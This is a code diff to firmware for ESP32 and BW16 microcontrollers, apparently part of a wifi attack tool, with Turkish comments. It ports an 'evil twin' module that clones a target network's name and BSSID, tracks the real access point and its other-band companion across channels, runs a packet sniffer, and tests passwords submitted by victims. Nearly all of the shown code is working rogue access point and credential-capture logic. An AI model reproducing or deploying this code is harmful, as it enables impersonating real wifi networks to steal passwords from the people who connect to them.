@@ -1,11 +1,11 @@
 #include <WiFi.h>
+#include "platform_compat.h"
 #include "evil_twin.h"
 #include "board_hal.h"
 #include "definitions.h"
 #include "passwords.h"
 #include "types.h"
 #include "web_interface.h"
-#include "definitions.h"
 
 // WPS ve HTTPS redirect yalnızca ESP32'de derlenir
 #ifndef BOARD_BW16
@@ -13,8 +13,6 @@
 #include <esp_wps.h>
 #include <DNSServer.h>
 #include "https_redirect.h"
-#else
-#include <DNSServer.h>
 #endif
 
 // num_networks: web_interface.cpp'de tanımlı
@@ -53,9 +51,9 @@ static uint8_t       et_last_client[6] = {0};
 static int et_find_companion(const uint8_t *primary_bssid, int primary_ch) {
   bool primary_5g = IS_5GHZ_CHANNEL(primary_ch);
   for (int i = 0; i < num_networks; i++) {
-    int ch = WiFi.channel(i);
+    int ch = WiFi_channel_scan(i);
     if (IS_5GHZ_CHANNEL(ch) == primary_5g) continue;
-    if (memcmp(primary_bssid, WiFi.BSSID(i), 3) == 0) return i;
+    if (memcmp(primary_bssid, WiFi_BSSID_scan(i), 3) == 0) return i;
   }
   return -1;
 }
@@ -441,9 +439,9 @@ static void et_start_sniffer() {
 
 // ─── Evil Twin başlat ─────────────────────────────────────────────────────────
 void start_evil_twin(int wifi_number) {
-  evil_twin_ssid    = WiFi.SSID(wifi_number);
-  evil_twin_channel = WiFi.channel(wifi_number);
-  memcpy(evil_twin_bssid, WiFi.BSSID(wifi_number), 6);
+  evil_twin_ssid    = WiFi_SSID_cstr(wifi_number);
+  evil_twin_channel = WiFi_channel_scan(wifi_number);
+  memcpy(evil_twin_bssid, WiFi_BSSID_scan(wifi_number), 6);
   evil_twin_clients = 0;
   evil_twin_active  = true;
   et_last_retrack   = millis();
@@ -454,8 +452,8 @@ void start_evil_twin(int wifi_number) {
   int comp_idx = et_find_companion(evil_twin_bssid, evil_twin_channel);
   if (comp_idx >= 0) {
     evil_twin_has_companion = true;
-    evil_twin_channel2      = WiFi.channel(comp_idx);
-    memcpy(evil_twin_bssid2, WiFi.BSSID(comp_idx), 6);
+    evil_twin_channel2      = WiFi_channel_scan(comp_idx);
+    memcpy(evil_twin_bssid2, WiFi_BSSID_scan(comp_idx), 6);
     DEBUG_PRINTF("ET Cift bant: eslıkci kanal %d %s BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
       evil_twin_channel2,
       IS_5GHZ_CHANNEL(evil_twin_channel2) ? "(5GHz)" : "(2.4GHz)",
@@ -482,9 +480,13 @@ void start_evil_twin(int wifi_number) {
   esp_wifi_get_mode(&cur_mode);
 #endif
   if (cur_mode != WIFI_MODE_APSTA) {
+#ifndef BOARD_BW16
     WiFi.mode(WIFI_MODE_APSTA);
+#endif
   }
+#ifndef BOARD_BW16
   WiFi.setAutoReconnect(false);
+#endif
   WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);
 
   delay(cur_mode == WIFI_MODE_APSTA ? 80 : 150);
@@ -505,7 +507,9 @@ bool evil_twin_test_password(const String &password) {
   DEBUG_PRINT("Sifre deneniyor: ");
   DEBUG_PRINTLN(password);
 
+#ifndef BOARD_BW16
   WiFi.setAutoReconnect(false);
+#endif
   hal_wifi_set_promiscuous(false);
 
 #ifndef BOARD_BW16
@@ -555,22 +559,22 @@ static void et_retrack() {
 
   hal_wifi_set_promiscuous(false);
 
-  int n = WiFi.scanNetworks(false, true, false, 120);
+  int n = WiFi_scanNetworks_ex();
   bool found_primary   = false;
   bool found_companion = false;
 
   for (int i = 0; i < n; i++) {
     // Birincil: SSID + OUI eşleşmesi
     if (!found_primary &&
-        WiFi.SSID(i) == evil_twin_ssid &&
-        memcmp(WiFi.BSSID(i), evil_twin_bssid, 3) == 0) {
+        String(WiFi_SSID_cstr(i)) == evil_twin_ssid &&
+        memcmp(WiFi_BSSID_scan(i), evil_twin_bssid, 3) == 0) {
 
-      int  new_ch  = WiFi.channel(i);
+      int  new_ch  = WiFi_channel_scan(i);
       bool changed = (new_ch != evil_twin_channel) ||
-                     (memcmp(WiFi.BSSID(i), evil_twin_bssid, 6) != 0);
+                     (memcmp(WiFi_BSSID_scan(i), evil_twin_bssid, 6) != 0);
       if (changed) {
         evil_twin_channel = new_ch;
-        memcpy(evil_twin_bssid, WiFi.BSSID(i), 6);
+        memcpy(evil_twin_bssid, WiFi_BSSID_scan(i), 6);
         memcpy(et_frame.access_point, evil_twin_bssid, 6);
         memcpy(et_frame.sender,       evil_twin_bssid, 6);
         WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);
@@ -584,14 +588,14 @@ static void et_retrack() {
 
     // Eşlikçi: OUI eşleşmesi + farklı bant
     if (!found_companion && evil_twin_has_companion &&
-        memcmp(evil_twin_bssid, WiFi.BSSID(i), 3) == 0 &&
-        IS_5GHZ_CHANNEL(WiFi.channel(i)) != IS_5GHZ_CHANNEL(evil_twin_channel)) {
+        memcmp(evil_twin_bssid, WiFi_BSSID_scan(i), 3) == 0 &&
+        IS_5GHZ_CHANNEL(WiFi_channel_scan(i)) != IS_5GHZ_CHANNEL(evil_twin_channel)) {
 
-      int new_ch2 = WiFi.channel(i);
+      int new_ch2 = WiFi_channel_scan(i);
       if (new_ch2 != evil_twin_channel2 ||
-          memcmp(WiFi.BSSID(i), evil_twin_bssid2, 6) != 0) {
+          memcmp(WiFi_BSSID_scan(i), evil_twin_bssid2, 6) != 0) {
         evil_twin_channel2 = new_ch2;
-        memcpy(evil_twin_bssid2, WiFi.BSSID(i), 6);
+        memcpy(evil_twin_bssid2, WiFi_BSSID_scan(i), 6);
         DEBUG_PRINTF("ET eslıkci yeni kanal: %d %s\n",
           evil_twin_channel2,
           IS_5GHZ_CHANNEL(evil_twin_channel2) ? "(5GHz)" : "(2.4GHz)");
@@ -601,7 +605,7 @@ static void et_retrack() {
 
     if (found_primary && (!evil_twin_has_companion || found_companion)) break;
   }
-  WiFi.scanDelete();
+  WiFi_scanDelete();
   et_start_sniffer();
 }
 
@@ -664,7 +668,9 @@ void stop_evil_twin() {
 #endif
 
   WiFi.softAPdisconnect();
+#ifndef BOARD_BW16
   WiFi.mode(WIFI_MODE_APSTA);
+#endif
   WiFi.softAP(AP_SSID, AP_PASS);
   apply_max_performance();
 
